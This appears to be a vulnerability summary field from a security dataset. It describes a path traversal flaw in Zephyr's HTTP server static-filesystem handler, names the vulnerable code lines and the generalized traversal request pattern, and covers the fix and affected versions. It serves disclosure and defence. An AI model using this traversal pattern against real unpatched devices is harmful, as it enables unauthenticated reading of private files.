items.summary: Zephyr's HTTP server (subsys/net/lib/http) provides a static-filesystem resource type (HTTP_RESOURCE_TYPE_STATIC_FS, available when CONFIG_FILE_SYSTEM is enabled) that serves files from a configured root directory. Before this fix, both the HTTP/1 and HTTP/2 front-ends placed the raw, attacker-controlled request path into client->url_buffer (assembled in on_url() for HTTP/1 and copied verbatim from the :path pseudo-header for HTTP/2) without resolving ./.. segments. The static-FS handler then built the on-disk filename by directly concatenating the configured root with that raw URL (snprintk(fname, ..., "%s%s", static_fs_detail->fs_path, client->url_buffer) at http_server_http1.c:603 and http_server_http2.c:490) and opened it with fs_open(fname, FS_O_READ). Because the handler is reached via wildcard/leading-dir (fnmatch FNM_LEADING_DIR) or fallback resource matching, a request such as GET /<prefix>/../../<file> is dispatched to the handler and, after the underlying filesystem (e.g. LittleFS/FAT) resolves the .. segments, escapes the configured web root, letting an unauthenticated remote client read arbitrary readable files on the mounted volume (information disclosure). The HTTP server requires no TLS or authentication to reach this path. The fix adds http_server_remove_dot_segments(), which canonicalizes the path portion of the URL before resource lookup in both protocol handlers, neutralizing the traversal. Affects releases v4.0.0 through v4.4.0 for deployments that register a static-filesystem resource.
